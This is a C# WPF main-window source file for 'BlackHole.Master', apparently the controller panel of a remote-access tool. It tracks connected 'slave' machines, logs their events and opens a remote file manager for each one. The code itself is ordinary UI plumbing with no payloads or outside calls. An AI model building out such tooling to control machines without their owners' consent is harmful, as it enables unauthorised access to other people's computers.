using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class MainWindow : IEventListener<SlaveEvent, Slave>
    {
        /// <summary>
        /// 
        /// </summary>
        public static MainWindow Instance
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private List<Window> m_childWindows;

        /// <summary>
        /// 
        /// </summary>
        static MainWindow()
        {
            Instance = new MainWindow();
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<Slave> ViewModelSlaves
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private void Initialize()
        {
            SlavesList.DataContext = ViewModelSlaves = new ViewModelCollection<Slave>();

            Slave.SlaveEvents.Subscribe(this);
            NetworkService.Instance.Start();

            AddInfoMessage("NetworkService running...");
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async Task AddConsoleMessage(Brush color, string message)
        {           
            await this.ExecuteInDispatcher(() =>
            {
                var textRange = new TextRange(Console.Document.ContentEnd, Console.Document.ContentEnd);
                textRange.Text = message + '\u2028';
                textRange.ApplyPropertyValue(TextElement.ForegroundProperty, color);
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async void AddInfoMessage(string message) => await AddConsoleMessage(Brushes.Green, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="messag"></param>
        public async void AddErrorMessage(string message) => await AddConsoleMessage(Brushes.Red, message);
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.CONNECTED:
                        ViewModelSlaves.Items.Add(ev.Source);
                        AddInfoMessage($"connected slave={ev.Source.ToString()}");
                        break;
                    case SlaveEventType.DISCONNECTED:
                        ViewModelSlaves.Items.Remove(ev.Source);
                        CloseSlaveWindows(ev.Source.Id);
                        AddInfoMessage($"disconnected slave={ev.Source.ToString()}");

                        break;
                    case SlaveEventType.INCOMMING_MESSAGE:
                        if(!(ev.Data is PongMessage))
                        {
                            AddInfoMessage($"received id={ev.Source.Id} slave={ev.Source.UserName} message={ev.Data.GetType().Name}");
                        }
                        break;
                }
            });
        }



        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            NetworkService.Instance.Stop();
            m_childWindows.ForEach(async (window) => await window.ExecuteInDispatcher(() => window.Close()));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OpenFileManager(object sender, RoutedEventArgs e)
        {
            if (SlavesList.SelectedItem == null)
                return;

            RegisterOrOpenChildWindow(new FileManager((Slave)SlavesList.SelectedItem));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slaveId"></param>
        private List<Window> FindSlaveWindows(int slaveId)
        {
            var windows = new List<Window>();
            foreach (var window in m_childWindows.OfType<SlaveWindow>())
                if (window.Slave.Id == slaveId)
                    windows.Add(window);
            return windows;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        private void CloseSlaveWindows(int slaveId)
           => FindSlaveWindows(slaveId).ForEach(async window => await window.ExecuteInDispatcher(() => window.Close()));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="window"></param>
        private async void RegisterOrOpenChildWindow<T>(T window) where T : SlaveWindow
        {
            // focus the existing window
            var existingWindow = m_childWindows
                .OfType<T>()
                .FirstOrDefault(w => (w.Slave.Id == window.Slave.Id));
            if (existingWindow != null)
            {
                await existingWindow.ExecuteInDispatcher(() => existingWindow.Focus());
                return;
            }

            // hook the closing so we remove 
            window.Closed += async (s, args) =>
            {
                await this.ExecuteInDispatcher(() =>
                {
                    Slave.SlaveEvents.Unsubscribe(window);
                    m_childWindows.Remove(window);
                });
            };

            // register the slave window to the events of the slave
            Slave.SlaveEvents.Subscribe((ev) => ev.Source.Id == window.Slave.Id, window);

            m_childWindows.Add(window);

            // finally, open up the window
            window.Show();
        }
    }
}
